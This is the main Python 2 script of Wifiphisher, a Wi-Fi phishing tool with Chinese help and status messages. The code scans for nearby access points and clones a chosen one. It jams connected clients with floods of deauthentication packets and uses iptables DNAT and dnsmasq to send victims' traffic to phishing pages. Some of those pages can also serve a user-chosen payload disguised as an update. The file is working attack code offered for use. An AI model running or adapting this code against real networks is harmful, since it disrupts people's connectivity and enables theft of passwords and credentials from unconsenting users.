#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import string
import re
import time
import sys
import argparse
import fcntl
import pickle
from threading import Thread, Lock
from subprocess import Popen, PIPE, check_output
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from shutil import copyfile
import phishingpage
import phishinghttp
import macmatcher
import interfaces
from constants import *

VERSION = "1.2"
conf.verb = 0
count = 0  # for channel hopping Thread
APs = {} # for listing APs
clients_APs = []
hop_daemon_running = True
sniff_daemon_running = True
jamming_daemon_running = True
terminate = False
lock = Lock()
args = 0
mon_MAC = 0

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-s",
        "--skip",
        help="跳过攻击这个 MAC 地址. 例如: -s 00:11:BB:33:44:AA"
    )
    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("选择一个支持监听模式的网卡用来攻击受骗者wifi. " +
              "例如: -jI wlan1"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("选择一个网卡来模拟wifi热点. " +
              "例如: -aI wlan0"
              )
    )
    parser.add_argument(
        "-t",
        "--timeinterval",
        help=("手动设定洪水攻击的时间")
    )
    parser.add_argument(
        "-dP",
        "--deauthpackets",
        help=("指定洪水攻击包的数量. " +
              "默认为 1; 1 个包发给客户端 1 包发给AP " +
              "发送2个" +
              "例如: -dP 2"
              )
    )
    parser.add_argument(
        "-d",
        "--directedonly",
        help=("Skip the deauthentication packets to the broadcast address of" +
              "the access points and only send them to client/AP pairs"
              ),
        action='store_true')
    parser.add_argument(
        "-nJ",
        "--nojamming",
        help=("跳过洪水攻击，这时只需要一个网卡"
              ),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("输入要模拟的wifi热点的名字. " +
             "这将跳过选择wifi热点" +
             "例如: --essid 'Free WiFi'"
             )
    )
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("选择钓鱼页面，"+
              "这将跳过选择页面 " +
              "例如: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("为模拟的wifi热点添加 WPA/WPA2 保护 " +
              "例如: -pK s3cr3tp4ssw0rd"))

    return parser.parse_args()

def check_args(args):
    """
    Checks the given arguments for logic errors.
    """

    if args.presharedkey and \
    (len(args.presharedkey) < 8 \
    or len(args.presharedkey) > 64):
        sys.exit('[' + R + '-' + W + '] 无线Wi-Fi密码必须 8-63 个字符长度')

    if (args.jamminginterface and not args.apinterface) or \
    (not args.jamminginterface and args.apinterface):
        sys.exit('[' + R + '-' + W + '] --apinterface (-aI) 和 --jamminginterface (-jI) 结合时被占用.')

    if args.nojamming and args.jamminginterface:
        sys.exit('[' + R + '-' + W + '] --nojamming (-nJ) 和 --jamminginterface (-jI) 不能同时运行.')


def stopfilter(x):
    if not sniff_daemon_running:
        return True
    return False

def shutdown(template=None, network_manager=None):
    """
    Shutdowns program.
    """
    global jamming_daemon_running, sniff_daemon_running
    jamming_daemon_running = False
    sniff_daemon_running = False

    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')

    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
        os.remove('/tmp/wifiphisher-webserver.tmp')
    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
        os.remove('/tmp/wifiphisher-jammer.tmp')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')

    # Set all the used interfaces to managed (normal) mode and show any errors
    if network_manager:
        try:
            network_manager.reset_ifaces_to_managed()
        except:
            print '[' + R + '!' + W + '] 重置网卡模式失败'

    # Remove any template extra files
    if template:
        template.remove_extra_files()

    print '[' + R + '!' + W + '] 关闭中'
    sys.exit(0)


def set_fw_rules():
    """
    Set iptable rules
    """
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
         % (NETWORK_GW_IP, PORT))
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination %s:%s'
         % (NETWORK_GW_IP, 53))
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination %s:%s'
         % (NETWORK_GW_IP, 53))
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
         % (NETWORK_GW_IP, SSL_PORT))
    )


def set_kernel_var():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )


def channel_hop(mon_iface):
    chan = 0
    while hop_daemon_running:
        try:
            if chan > 11:
                chan = 0
            chan = chan + 1
            channel = chan
            mon_iface.set_channel(channel)
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()


def sniffing(interface, cb):
    '''This exists for if/when I get deauth working
    so that it's easy to call sniff() in a thread'''
    try:
        sniff(iface=interface, prn=cb, stop_filter=stopfilter, \
        store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))
    except socket.error as e:
        # Network is down
        if e.errno == 100:
            pass
        else:
            raise


def targeting_cb(pkt):

    global APs, count

    bssid = pkt[Dot11].addr3
    p = pkt[Dot11Elt]
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    essid, channel = None, None
    crypto = set()
    while isinstance(p, Dot11Elt):
        if p.ID == 0:
            try: p.info.decode('utf8')
            except UnicodeDecodeError: essid = "<contains non-printable chars>"
            else: essid = p.info
        elif p.ID == 3:
            try:
                channel = str(ord(p.info))
            # TypeError: ord() expected a character, but string of length 2 found
            except Exception:
                return
        elif p.ID == 48:
            crypto.add("WPA2")
        elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
        p = p.payload
    if not crypto:
        if 'privacy' in cap:
            crypto.add("WEP")
        else:
            crypto.add("OPEN")

    if len(APs) > 0:
        for num in APs:
            if essid in APs[num][1]:
                return
    count += 1
    APs[count] = [channel, essid, bssid, '/'.join(list(crypto))]
    target_APs()


def target_APs():
    global APs, count, mac_matcher
    os.system('clear')
    print ('[' + G + '+' + W + '] 按下 Ctrl-C 复制wifi热点')

    max_name_size = max(map(lambda ap: len(ap[1]), APs.itervalues()))

    header = ('{0:3}  {1:3}  {2:{width}}   {3:19}  {4:14}  {5:}'
        .format('num', 'ch', 'ESSID', 'BSSID', 'encr', 'vendor', width=max_name_size + 1))

    print header
    print '-' * len(header)

    for ap in APs:

        mac = APs[ap][2]
        crypto = APs[ap][3]
        vendor = mac_matcher.get_vendor_name(mac)

        print ((G + '{0:2}' + W + ' - {1:2}  - ' +
               T + '{2:{width}} ' + W + ' - ' +
               B + '{3:17}' + W + ' - {4:12} - ' +
               R + ' {5:}' + W
            ).format(ap,
                    APs[ap][0],
                    APs[ap][1],
                    mac,
                    crypto,
                    vendor,
                    width=max_name_size))


def copy_AP():
    global APs, count
    copy = None
    while not copy:
        try:
            copy = raw_input(
                ('\n[' + G + '+' + W + '] 选择 [' + G + 'num' + W +
                 '] 一个你想模拟的wifi热点序号: ')
            )
            copy = int(copy)
        except KeyboardInterrupt:
            shutdown()
        except:
            copy = None
            continue
    try:
        channel = APs[copy][0]
        essid = APs[copy][1]
        if str(essid) == "\x00":
            essid = ' '
        mac = APs[copy][2]
        enctype = APs[copy][3]
        return channel, essid, mac, enctype
    except KeyError:
        return copy_AP()


def select_template(template_argument):
    """
    Select a template based on whether the template argument is set or not. If
    the template argument is not set, it will interactively ask user for a
    template.

    Args:
        template_argument (str): The template argument which might have been
                                 entered by the user.

    Returns:
        (PhishingTemplate): A PhishingTemplate object.

    Raises:
        InvalidTemplate: In case the template argument entered by the user is
                         not available.
    """

    # create a template manager object
    template_manager = phishingpage.TemplateManager()

    # get all available templates
    templates = template_manager.get_templates()

    # get all the templates names for display
    template_names = list(templates.keys())

    # check if the template argument is set and is correct
    if template_argument and template_argument in templates:
        # return the template name
        return templates[template_argument]
    elif template_argument and template_argument not in templates:
        # in case of an invalid template
        raise phishingpage.InvalidTemplate
    else:
        # loop until all operations for template selection is done
        while True:
            # clear the screen
            os.system('clear')

            # display template header
            print "\n可用的钓鱼场景:\n"

            # display the templates
            for number in range(len(template_names)):
                print (G + str(number + 1) + W + " - " +
                       str(templates[template_names[number]]))

            # get user's choice
            choosen_template = raw_input("\n[" + G + "+" + W +
                                         "] 选择 [" + G + "num" + W +
                                         "] 你想使用的钓鱼场景: ")

            # placed to avoid a program crash in case of non integer input
            try:
                template_number = int(choosen_template)
            except ValueError:
                print "\n[" + R + "-" + W + "] 请输入一个数字."

                # start from the beginning
                continue

            if template_number not in range(1, len(template_names) + 1):
                print ("\n[" + R + "-" + W + "] 错误的数字，请重试")

                # start from the beginning
                continue

            # remove 1 from template number which was added for display reasons
            template_number -= 1

            # return the chosen template
            return templates[template_names[template_number]]


def start_ap(mon_iface, channel, essid, args):
    print '[' + T + '*' + W + '] 开始模拟wifi...'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )
    if args.presharedkey:
        config += (
            'wpa=2\n'
            'wpa_passphrase=%s\n'
        ) % args.presharedkey

    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % (mon_iface, essid, channel))

    hostapd_proc = Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
    try:
        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
        if hostapd_proc.poll() != None:
            # hostapd will exit on error
            print('[' + R + '+' + W +
                  '] 模拟失败! (hostapd error)\n' +
                  '[' + R + '+' + W +
                  '] 或许可以换个网卡试试，用命令： -aI .'
                  )
            shutdown()
    except KeyboardInterrupt:
        shutdown()


def dhcp_conf(interface):

    config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
    )

    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
    return '/tmp/dhcpd.conf'


def dhcp(dhcpconf, mon_iface):
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    Popen(
        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
         'netmask', NETWORK_MASK
         ],
        stdout=DN,
        stderr=DN
    )
    # Give it some time to avoid "SIOCADDRT: Network is unreachable"
    time.sleep(.5)
    # Make sure that we have set the network properly.
    proc = check_output(['ifconfig', str(mon_iface)])
    if NETWORK_GW_IP not in proc:
        return False
    os.system(
        ('route add -net %s netmask %s gw %s' %
         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
    )
    return True


# Wifi Jammer stuff
# TODO: Merge this with the other channel_hop method.
def channel_hop2(mon_iface):
    '''
    First time it runs through the channels it stays on each channel for
    5 seconds in order to populate the deauth list nicely.
    After that it goes as fast as it can
    '''
    global monchannel, first_pass, args, jamming_daemon_running

    channelNum = 0

    if args.channel:
        with lock:
            monchannel = args.channel
    while jamming_daemon_running:
        if not args.channel:
            channelNum += 1
            if channelNum > 11:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = channelNum
            mon_iface.set_channel(monchannel)
        output(monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # For the first channel hop thru, do not deauth
            if first_pass == 1:
                time.sleep(1)
                continue
        deauth(monchannel)


def deauth(monchannel):
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway
    if there's multi-APs to one gateway. Constantly scans the clients_APs list
    and starts a thread to deauth each instance
    '''

    global clients_APs, APs, args

    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                '''
                Can't add a RadioTap() layer as the first layer or it's a
                malformed Association request packet?
                Append the packets to a new list so we don't have to hog the
                lock type=0, subtype=12?
                '''
                if ch == monchannel:
                    deauth_pkt1 = Dot11(
                        addr1=client,
                        addr2=ap,
                        addr3=ap) / Dot11Deauth()
                    deauth_pkt2 = Dot11(
                        addr1=ap,
                        addr2=client,
                        addr3=client) / Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        deauth_ap = Dot11(
                            addr1='ff:ff:ff:ff:ff:ff',
                            addr2=ap,
                            addr3=ap) / Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.deauthpackets:
            args.deauthpackets = 1

        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.deauthpackets))


def output(monchannel):
    global clients_APs, APs, args
    wifi_jammer_tmp = "/tmp/wifiphisher-jammer.tmp"
    with open(wifi_jammer_tmp, "a+") as log_file:
        log_file.truncate()
        with lock:
            for ca in clients_APs:
                if len(ca) > 3:
                    log_file.write(
                        ('[' + T + '*' + W + '] ' + O + ca[0] + W +
                         ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(2) +
                         ' - ' + T + ca[3] + W + '\n')
                    )
                else:
                    log_file.write(
                        '[' + T + '*' + W + '] ' + O + ca[0] + W +
                        ' - ' + O + ca[1] + W + ' - ' + ca[2] + W + '\n'
                    )
        with lock:
            for ap in APs:
                log_file.write(
                    '[' + T + '*' + W + '] ' + O + ap[0] + W +
                    ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W + '\n'
                )
        # print ''


def noise_filter(skip, addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast,
    # broadcast
    ignore = [
        'ff:ff:ff:ff:ff:ff',
        '00:00:00:00:00:00',
        '33:33:00:', '33:33:ff:',
        '01:80:c2:00:00:00',
        '01:00:5e:',
        mon_MAC
    ]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True


def cb(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.
    '''
    global clients_APs, APs, args, sniff_daemon_running

    if sniff_daemon_running:
        # return these if's keeping clients_APs the same or just reset clients_APs?
        # I like the idea of the tool repopulating the variable more

        '''
        We're adding the AP and channel to the deauth list at time of creation
        rather than updating on the fly in order to avoid costly for loops
        that require a lock.
        '''

        if pkt.haslayer(Dot11):
            if pkt.addr1 and pkt.addr2:

                # Filter out all other APs and clients if asked
                if args.accesspoint:
                    if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                        return

                # Check if it's added to our AP list
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    APs_add(clients_APs, APs, pkt, args.channel)

                # Ignore all the noisy packets like spanning tree
                if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                    return

                # Management = 1, data = 2
                if pkt.type in [1, 2]:
                    clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)


def APs_add(clients_APs, APs, pkt, chan_arg):
    ssid = pkt[Dot11Elt].info
    bssid = pkt[Dot11].addr3
    try:
        # Thanks to airoscapy for below
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        # Prevent 5GHz APs from being thrown into the mix
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])


def clients_APs_add(clients_APs, addr1, addr2):

    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])


def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])


def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] 监听模式: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac


def sniff_dot11(mon_iface):
    """
    We need this here to run it from a thread.
    """
    try:
        sniff(iface=mon_iface, store=0, prn=cb, stop_filter=stopfilter)
    except socket.error as e:
        # Network is down
        if e.errno == 100:
            pass
        else:
            raise

def kill_interfering_procs():
    # Kill any possible programs that may interfere with the wireless card
    # For systems with airmon-ng installed
    if os.path.isfile('/usr/sbin/airmon-ng'):
        proc = Popen(['airmon-ng', 'check', 'kill'], stdout=PIPE, stderr=DN)
    # For ubuntu distros with nmcli
    elif os.path.isfile('/usr/bin/nmcli') and \
            os.path.isfile('/usr/sbin/rfkill'):
        Popen(
            ['nmcli', 'radio', 'wifi', 'off'],
            stdout=PIPE,
            stderr=DN
        ).wait()
        Popen(
            ['rfkill', 'unblock', 'wlan'],
            stdout=PIPE,
            stderr=DN
        ).wait()

        time.sleep(1)

def run():

    print ('[' + T + '*' + W + ']  Wifiphisher 启动中 %s at %s' % \
          (VERSION, time.strftime("%Y-%m-%d %H:%M")))

    # Parse args
    global args, APs, clients_APs, mon_MAC, mac_matcher, hop_daemon_running
    args = parse_args()

    # Check args
    check_args(args)

    # Are you root?
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] 请使用 root')

    # TODO: We should have more checks here:
    # Is anything binded to our HTTP(S) ports?
    # Maybe we should save current iptables rules somewhere

    network_manager = interfaces.NetworkManager()

    mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)

    # get interfaces for monitor mode and AP mode and set the monitor interface
    # to monitor mode. shutdown on any errors
    try:
        if not args.nojamming:
            if args.jamminginterface and args.apinterface:
                mon_iface = network_manager.get_jam_iface(args.jamminginterface)
                ap_iface = network_manager.get_ap_iface(args.apinterface)
            else:
                mon_iface, ap_iface = network_manager.find_interface_automatically()
            network_manager.set_jam_iface(mon_iface.get_name())
            network_manager.set_ap_iface(ap_iface.get_name())
            # display selected interfaces to the user
            print ("[{0}+{1}] 选择 {0}{2}{1} 网卡作为攻击使用 "\
                   "\n[{0}+{1}] 选择 {0}{3}{1} 网卡作为模拟wifi使用 "\
                   "").format(G, W, mon_iface.get_name(), ap_iface.get_name())
        else:
            ap_iface = network_manager.get_ap_iface()
            mon_iface = ap_iface
            network_manager.set_ap_iface(ap_iface.get_name())
            print ("[{0}+{1}] 选择 {0}{2}{1} 网卡模拟wifi使用 "\
                   "").format(G, W, ap_iface.get_name())

        kill_interfering_procs()

        # set monitor mode to monitor interface
        network_manager.set_interface_mode(mon_iface, "monitor")
    except (interfaces.NotEnoughInterfacesFoundError,
            interfaces.JammingInterfaceInvalidError,
            interfaces.ApInterfaceInvalidError,
            interfaces.NoApInterfaceFoundError,
            interfaces.NoMonitorInterfaceFoundError) as err:
        print ("[{0}!{1}] " + str(err)).format(R, W)
        time.sleep(2)
        shutdown()

    set_fw_rules()
    set_kernel_var()
    network_manager.up_ifaces([ap_iface, mon_iface])

    print '[' + T + '*' + W + '] Cleared leases, 启动 DHCP, 设置 iptables'

    if args.essid:
        essid = args.essid
        channel = str(CHANNEL)
        args.accesspoint = False
        args.channel = False
        ap_mac = None
        enctype = None
    else:
        # Copy AP
        time.sleep(3)
        hop = Thread(target=channel_hop, args=(mon_iface,))
        hop.daemon = True
        hop.start()
        sniffing(mon_iface.get_name(), targeting_cb)
        channel, essid, ap_mac, enctype = copy_AP()
        args.accesspoint = ap_mac
        args.channel = channel
        hop_daemon_running = False

    # get the correct template
    template = select_template(args.phishingscenario)

    print ("[" + G + "+" + W + "] 选择 " + template.get_display_name() +
           " 模板")

    # payload selection for browser plugin update
    if template.has_payload():
        payload_path = False
        # copy payload to update directory
        while not payload_path or not os.path.isfile(payload_path):
            # get payload path
            payload_path = raw_input("[" + G + "+" + W +
                                     "] 输入 [" + G + "全路径" + W +
                                     "] 你想使用的服务器: ")
            if not os.path.isfile(payload_path):
                print '[' + R + '-' + W + '] 路径不可用!'
        print '[' + T + '*' + W + '] 使用 ' + G + payload_path + W + ' 中 '
        copyfile(payload_path, PHISHING_PAGES_DIR + template.get_payload_path())

    APs_context = []
    for i in APs:
        APs_context.append({
            'channel': APs[i][0],
            'essid': APs[i][1],
            'bssid': APs[i][2],
            'vendor': mac_matcher.get_vendor_name(APs[i][2])
        })

    template.merge_context({'APs': APs_context})

    ap_logo_path = template.use_file(mac_matcher.get_vendor_logo_path(ap_mac))

    template.merge_context({
        'target_ap_channel': args.channel,
        'target_ap_essid': essid,
        'target_ap_bssid': ap_mac,
        'target_ap_encryption': enctype,
        'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac),
        'target_ap_logo_path': ap_logo_path
    })

    phishinghttp.serve_template(template)

    # We want to set this now for hostapd. Maybe the interface was in "monitor"
    # mode for network discovery before (e.g. when --nojamming is enabled).
    network_manager.set_interface_mode(ap_iface, "managed")
    # Start AP
    start_ap(ap_iface.get_name(), channel, essid, args)
    dhcpconf = dhcp_conf(ap_iface.get_name())
    if not dhcp(dhcpconf, ap_iface.get_name()):
        print('[' + G + '+' + W +
              '] 不能设置ip地址 %s!' % ap_iface.get_name()
              )
        shutdown(template)
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' 设置频道 ' +
           T + channel + W + ' via ' + T + mon_iface.get_name() +
           W + ' on ' + T + str(ap_iface.get_name()) + W)

    # With configured DHCP, we may now start the web server
    # Start HTTP server in a background thread
    Handler = phishinghttp.HTTPRequestHandler
    try:
        httpd = phishinghttp.HTTPServer((NETWORK_GW_IP, PORT), Handler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + '] 不能启动 HTTP 服务 (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] 或许另一个进程正在使用端口' + str(PORT) + '?\n' +
            '[' + R + '!' + W + '] 关闭中...'
        ))
    print '[' + T + '*' + W + '] HTTP 服务启动端口： ' + str(PORT)
    webserver = Thread(target=httpd.serve_forever)
    webserver.daemon = True
    webserver.start()
    # Start HTTPS server in a background thread
    Handler = phishinghttp.SecureHTTPRequestHandler
    try:
        httpd = phishinghttp.SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + ']不能开启 HTTPS 服务 (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] 或许另一个进程正在使用端口 ' + str(SSL_PORT) + '?\n' +
            '[' + R + '!' + W + '] 关闭中...'
        ))
    print ('[' + T + '*' + W + ']  HTTPS 启动端口 ' +
           str(SSL_PORT))
    secure_webserver = Thread(target=httpd.serve_forever)
    secure_webserver.daemon = True
    secure_webserver.start()

    time.sleep(3)

    # We no longer need mac_matcher
    mac_matcher.unbind()

    clients_APs = []
    APs = []
    monitor_on = None
    conf.iface = mon_iface.get_name()
    mon_MAC = mon_mac(mon_iface.get_name())
    first_pass = 1

    monchannel = channel
    # Start channel hopping
    hop = Thread(target=channel_hop2, args=(mon_iface,))
    hop.daemon = True
    hop.start()

    # Start sniffing
    sniff_thread = Thread(target=sniff_dot11, args=(mon_iface.get_name(),))
    sniff_thread.daemon = True
    sniff_thread.start()

    # Main loop.
    try:
        while 1:
            os.system("clear")
            print "受干扰的设备: "
            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
            else:
                lines = "\n" * LINES_OUTPUT
            print lines
            print "DHCP 租约: "
            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
            else:
                lines = "\n" * LINES_OUTPUT
            print lines
            print "HTTP 请求: "
            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-webserver.tmp'])
                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
            else:
                lines = "\n" * LINES_OUTPUT
            print lines
            if phishinghttp.terminate:
                time.sleep(3)
                shutdown(template, network_manager)
            time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown(template, network_manager)
